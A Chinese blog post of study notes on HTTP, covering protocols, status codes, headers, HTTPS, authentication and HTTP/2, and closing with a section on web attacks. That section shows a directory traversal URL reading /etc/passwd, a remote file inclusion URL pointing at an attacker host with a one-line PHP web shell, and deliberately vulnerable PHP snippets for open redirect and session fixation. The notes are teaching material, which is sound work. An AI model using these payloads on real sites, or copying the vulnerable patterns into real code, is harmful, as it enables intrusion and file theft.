---
layout: post
category: ['架构', '复习', '笔记']
title: 图解 HTTP 学习笔记
---

##  知识栈

![Alt text](/res/img/in_posts/1499945837126.png)

## 网络基础 TCP/IP

- 应用层（HTTP / DNS / FTP / SMTP）
- 传输层（TCP / UDP）
- 网络层（IP协议：IP地址 + Mac地址）
- 链路层（网络硬件范畴）

### 网络层

#### IP 协议

IP 协议的作用是把各种数据包传送给对方。不仅包含 IP 地址，<u>还包括增加目的地的网卡 Mac 地址转发给链路层</u>

#### ARP 协议

地址解析协议（Address Resolution Protocol）：根据 IP 地址反查出对应的 Mac 地址

### 传输层

TCP 可靠性传输原理（SYN + ACK 标志的作用）

### 应用层

DNS 协议原理

### URI / URL

URI 是字符串标识某一互联网资源，而 URL 表示资源的地点（互联网所处的位置），可见 URL 是 URI 的子集。

RFC 3986 规定 URI（统一资源标识符）例子：

```text
ftp://ftp.silverd.cn/rfc/abc.txt
http://www.silverd.cn/abc.txt
mailto:silverd@qq.com
news:comp.info.www.silverd.cn
tel:+816575755
```

### 其他要点

- `TRACE` 方法的 `Max-Forwards` 没经过一层代码，都会自减1，直到为0，则立即返回，不再转发到下一层代理
- `CONNECT` 要求用隧道协议连接代理？

### Keep-Alive

HTTP 1.1 默认开启。

HTTP 持久连接（HTTP Persistent Connections / HTTP Keep-Alive / HTTP connection reuse）
旨在建立 1 次 TCP 连接后可进行多次请求和响应的交互（避免重复握手）。只要任意一端没有明确提出断开连接，则保持 TCP 连接状态。

管线化 `pipelining` 并发请求？

![Alt text](/res/img/in_posts/1499945916276.png)

## HTTP 报文

![Alt text](/res/img/in_posts/1499945796823.png)

报文主体和实体主体的差异：

- 报文是 HTTP 通信中的基本单位，由8位组字节流组成
- 实体作为请求或响应的有效载荷数据被传输，内容由实体首部和实体主体组成
- 通常，报文主体等于实体主体，只有当传输中进行编码操作时，实体主体的内容发生变化，才导致它和报文主体产生差异

压缩传输的内容编码：

- gzip (GUN zip)
- compress (UNIX 系统的标准压缩)
- deflate (zlib)
- identity (不进行编码)

分割发送的<u>分块传输编码</u> `Chunked Transfer Coding?`

multipart/form-data
multipart/byteranges

<u>获取部分内容的范围请求</u>：
`Range`: bytes=5001-10000, 12000-15000

## HTTP 状态码

| 状态码 | 参数名 | 说明 |
| -- | -- | -- |
| 1XX | Informational | 接收的请求正在处理 |
| 2XX | Success | 成功状态码 |
| 3XX | Redirection | 重定向状态码 |
| 4XX | Client Error | 客户端错误状态码 |
| 5XX | Server Error | 服务器错误状态码 |

![Alt text](/res/img/in_posts/1499945763912.png)

#### 204 No Content
一般操作成功无需返回时，例如 `DELETE` 方法后，可以响应 `204 No Content`

#### 206 Partial Content
响应报文包含由 `Content-Range` 指定范围的实体内容

#### 303  See Other / 307 Temporary Redirect
303 和 302 功能相同，但 303 明确标识客户端应当采用 GET 方法重定向前往获取资源。
理论上 301、302 是禁止将 POST 方法改变为 GET 方法的，但实际大家都会这么做。

#### 400 Bad Request

表示请求报文中有语法错误，服务端无法理解。

#### 401 Unauthorized

用于 `Basic Auth / Digest Auth`，401 响应必须包含 `WWW-Authenticate` 首部，要求用户输入密码等信息。浏览器初次接收到 401，会弹出认证用的对话窗口。

#### 500 Internal Server Error

服务器内部错误，例如是 PHP 语法错误

#### 503 Service Unavailable

服务器超负载或停机运行（注意和 Nginx `502 Bad Gateway` 和 `504 Gateway Timeout` 的区别）
响应中建议包含 `Retry-After` 首部，告知客户端稍后重试。

## Web Server

#### Virtual Host

请求头中的 `Host: www.silverd.cn` 字段，即 Apache 的 `ServerName` 读到的值，用于区分不同虚拟主机。

#### 代理：

代理是一种具有转发功能的程序，扮演了位于服务器和客户端『中间人』的角色。

代理服务器分两种（1、是否使用缓存 2、是否修改报文）：

- 缓存代理（Varnish/Squid）
- 透明代理（例如翻墙代理）纯转发，不对报文进行任何加工，反之，称为非透明代理

#### 网关

网关是转发其他服务器通信数据的服务器，接受从客户端发送过来的请求时，它就像自己拥有资源的源服务器一样对请求进行处理，有时客户端甚至不会意识到自己的通信目标是一个网关。

网关和代理的区别，工作机制两者相似，但网关能使通信线路上的服务器提供非 HTTP 协议服务（例如跳板机）。

#### 隧道

隧道相当于在 HTTP 外面包了一层，并不会修改任何 HTTP 报文主体。例如 SSL 隧道。

## HTTP 首部

分四种首部：

- 通用首部（请求和响应都有的首部）
- 请求首部
- 响应首部
- 实体首部

首部字段重复了怎么办？没有明确规定，各浏览器都不同，有的以前者为准，有的以后者为准。

一个首部字段可以有多个值，用逗号分隔：

```
Keep-Alive: timeout=15, max=100
```

#### 首部字段介绍

通用首部：

- Cache-Control：用于操作缓存的工作机制，如缓存时间，是否必须向服务器确认等
- Connection：控制不再转发给代理的首部字段和持久连接，HTTP/1.1 默认 `Connection:keep-alive`
- Date：表明创建 HTTP 报文的日期时间
- Transfer-Encoding：规定传输报文主体时采用的编码方式

请求首部：

- Accept
- Authorization
- Host （HTTP/1.1 规范中唯一一个必须包含在请求内的首部字段，可为空字符串，但不能没有）
- User-Agent
- Cookie

响应首部

- Location
- Server
- Set-Cookie

![](/res/img/in_posts/http-headers.jpg)

![Alt text](/res/img/in_posts/1499945679256.png)


## HTTPS / TLS

全称：Transport  Layer Security 安全传输层协议

SSL 是独立于 HTTP 的协议（可以理解为 SSL 协议运行在`表示层`）。其他运行在应用层的协议（SMTP/Telnet）都可配合 SSL 协议使用

公钥、私钥生成原理，为什么不容易破解？

HTTPS  握手、通信原理，可参考之前的博文：

- [理解 HTTPS](http://silverd.cn/2016/03/17/https.html)
- [如何选择 HTTPS/SSL 证书？](http://silverd.cn/2016/11/09/ssl-crt.html)

客户端证书：类似网银的 U 盾数字证书，需用户自行安装在客户端。

 密钥生成：CBC 模式（密码分组链接模式），将前一个明文块加密处理后和下一个明文块做  XOR 运算，使之重叠，然后在对运算结果做加密处理。对第一个明文块做加密时，要么使用前一段密文的最后一块，要么利用外部生成的初始向量（IV）。

HTTPS 比 HTTP 要慢 2~100 倍。

## HTTP 认证

认证方式分几种：

- Basic Auth（直接在请求头发送明文用户名和密码）
- Digest Auth（安全级别高于 Basic Auth，具体待理解）
- SSL Client Auth（浏览器必须先安装客户端证书，以实现免密码登录某网站，例如 WoSign 的登录）
- FormBase Auth（目前最常用的。另：表单提交密码时可先用盐值加密，防止被劫持窃听）

#### Cookie 防止 XSS 漏洞：

在写 Cookie 时设置 `HttpOnly` 标记，可防止 JS 通过 `document.cookie` 来获取 Cookie，从而防止 XSS 攻击。

## HTTP 追加协议

- SPDY (SPeeDY)
- Webscoket
- HTTP/2

#### Google SPDY

SPDY 以会话层形式加入在 HTTP 和 TCP 之间，同时规定通信必须使用 SSL。

- 多路复用（将同一个域名或 IP 地址的请求复用）
- 赋予请求优先级（SPDY 不仅可以无限制并发处理请求，还可以给请求分配优先级顺序 ）
- 压缩 HTTP 首部
- 服务器主动向客户端推送数据
- 服务器主动提示客户端请求所需的资源（待理解：和上一条的区别？）

#### WebSocket

全双工通信，建立在 HTTP 基础上，复用了 HTTP 协议的一部分定义。

请求：

    GET /chat HTTP/1.1
    Host: www.silverd.cn
    Upgrade: websocket
    Connection: Upgrade
    Sec-WebSocket-Key: dbgaksdjfa
    Sec-WebSocket-Protocol: chat, superchat （使用的子协议）
    Sec-WebSocket-Version: 13

响应：

    HTTP/1.1 101 Switching Protocols
    Upgrade: websocket
    Connection: Upgrade
    Sec-WebSocket-Accept: s34523423dk （由请求头中的 Sec-WebSocket-Key 生成）
    Sec-WebSocket-Protocol: chat

#### HTTP/2.0

七项技术：

- 多路复用
- TLS 义务化
- 协商
- 客户端拉拽、服务端推送
- 流量控制
- WebSocket

#### WebDAV

WebDAV 是一组基于 HTTP/1.1 的技术集合，使应用程序可以直接对 Web 服务器上文件进行操作。有利于用户间协同编辑和管理存储在万维网服务器文档。

通俗一点儿来说，WebDAV 就是一种互联网方法，应用此方法可以在服务器上划出一块存储空间，可以使用用户名和密码来控制访问，让用户可以直接存储、下载、编辑文件，支持写文件锁定及解锁，还可以支持文件的版本控制。

参考：<https://www.zhihu.com/question/21511143>


## 构建 Web 内容

- CGI / FastCGI / Java Servlet
- RSS / Atom
- JSON / Protobuff

## Web 攻击技术

#### 主动攻击：

- SQL 注入
- OS Shell 命令注入（应该避免将外部接收到的值直接被传入到系统命令中执行，例如 `open`、`system` 等）
- 密码撞库攻击（彩虹表：一个公开的、巨大的由明文密码和对应散列值组成的字典表）
- DDos （分布式拒绝服务攻击 Distributed Denial of Service Attack）

#### 被动攻击：

- XSS
- CSRF
- HTTP 首部注入（应该避免将外部接收到的值，赋给响应首部的字段，例如 Location / Set-Cookie 字段。攻击者会利用漏洞在响应首部字段内插入换行，从而达到添加任意响应首部或主体的目的）
    - Location / Set-Cookie
    - HTTP 响应截断攻击，将`%0D%0A%0D%0A`并排插入响应主体，这两个连续的换行会将 HTTP 头部和主体分隔。这样就能伪造主体部分。
- 邮件首部注入（利用 To / Subject 添加非法内容）

#### 目录遍历攻击

例如有页面：

```text
http://silverd.cn/read.php?file=0401.log
```

文件 `read.php` 内容：

```php
echo file_get_contents(RESOURCE_PATH . '/' . $_GET['file']);
```

攻击者改为：

```text
http://silverd.cn/read.php?file=../../etc/passwd
```

就可以读到不该读的东西了。

#### 远程文件包含漏洞


例如有页面：

```text
http://silverd.cn/index.php?controller=news
```

文件 `index.php` 内容：

```php
$controller = $_GET['controller'];
include_once APP_PATH . '/controllers/' . $controller;
```

攻击者改为：

```text
http://silverd.cn/index.php?controller=http://hackr.jp/cmd.php?cmd=ls
```

事先 `cmd.php` 已准备好攻击脚本：

```php
system($_GET['cmd']);
```

当 `http://silverd.cn/index.php` 运行时，就中招了。

#### 开放重定向漏洞

例如有页面：

```text
http://silverd.cn/login.php?redirect=/home
```

攻击者改为：

```text
http://silverd.cn/login.php?redirect=http://hackr.jp
```

用户点击后自动被跳转到攻击者网站，可信度高的 Web 网站开放重定向功能判断跳转目标，否则容易被攻击者利用当成钓鱼攻击的跳板。

#### Session 会话固定攻击

假设网站支持以 URL 参数接收并设置 `session_id`：

```text
http://silverd.cn/index.php?sess_id=ABCDEFG
```

文件 `index.php` 内容：

```php
if ($sessionId = $_GET['sess_id']) {
    session_id($sessionId);
}
```

攻击者把自己的 `session_id` 放到 URL 中，然后把 URL 发给被害者，被害者被诱导点进进去，然后登录认证。此时攻击者在打开这个 URL，身份就变成了被害者的身份，从而达到窃取认证的目的。

Session Adoption：

攻击者如果可以私自创建、伪造 `session_id`（如果服务器接受任何未知会话 ID 的话），那么攻击者可以跳过固话攻击的第一步，甚至不需要用自己真实的 `session_id` 了。

#### 点击劫持

用一个透明的域（iframe）覆盖在网页某个位置上，当用户点击该位置时，触发攻击脚本。

#### 参考文章

- <http://www.cnblogs.com/xing901022/p/4311987.html>